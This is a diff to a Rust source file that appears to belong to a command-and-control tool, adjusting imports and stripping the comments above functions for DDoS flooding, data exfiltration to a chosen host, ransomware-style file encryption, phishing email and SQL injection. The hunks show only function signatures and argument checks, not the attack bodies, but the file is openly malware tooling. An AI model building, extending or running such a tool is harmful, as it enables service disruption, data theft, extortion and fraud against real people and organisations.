@@ -1,10 +1,10 @@
 use crate::commands::Command;
 use crate::error::C2Error;
 use tokio::net::TcpStream;
-use tokio::io::{AsyncWriteExt, AsyncReadExt};
+use tokio::io::AsyncWriteExt;
 use std::process::Command as ShellCommand;
 use std::fs;
-use std::io::Write;
+use std::io::{Read, Write};
 
 pub async fn execute_attack(command: &Command) -> Result<(), C2Error> {
     match command.command.as_str() {
@@ -17,7 +17,6 @@ pub async fn execute_attack(command: &Command) -> Result<(), C2Error> {
     }
 }
 
-// DDoS attack: floods the target IP and port with TCP connections.
 async fn ddos_attack(args: &[String]) -> Result<(), C2Error> {
     if args.len() < 2 {
         return Err(C2Error::CommandError("Missing target IP or port".to_string()));
@@ -37,7 +36,6 @@ async fn ddos_attack(args: &[String]) -> Result<(), C2Error> {
     Ok(())
 }
 
-// Data Exfiltration: sends data to a target IP and port.
 async fn data_exfiltration(args: &[String]) -> Result<(), C2Error> {
     if args.len() < 3 {
         return Err(C2Error::CommandError("Missing target IP, port, or data".to_string()));
@@ -52,7 +50,6 @@ async fn data_exfiltration(args: &[String]) -> Result<(), C2Error> {
     Ok(())
 }
 
-// Ransomware Attack: encrypts files in a specified directory.
 async fn ransomware_attack(args: &[String]) -> Result<(), C2Error> {
     if args.len() < 2 {
         return Err(C2Error::CommandError("Missing target directory or encryption key".to_string()));
@@ -79,7 +76,6 @@ async fn ransomware_attack(args: &[String]) -> Result<(), C2Error> {
     Ok(())
 }
 
-// Phishing Attack: sends a phishing email.
 async fn phishing_attack(args: &[String]) -> Result<(), C2Error> {
     if args.len() < 2 {
         return Err(C2Error::CommandError("Missing target email or email content".to_string()));
@@ -109,7 +105,6 @@ async fn phishing_attack(args: &[String]) -> Result<(), C2Error> {
     Ok(())
 }
 
-// SQL Injection Attack: executes a malicious SQL query on the target.
 async fn sql_injection_attack(args: &[String]) -> Result<(), C2Error> {
     if args.len() < 2 {
         return Err(C2Error::CommandError("Missing target URL or malicious query".to_string()));
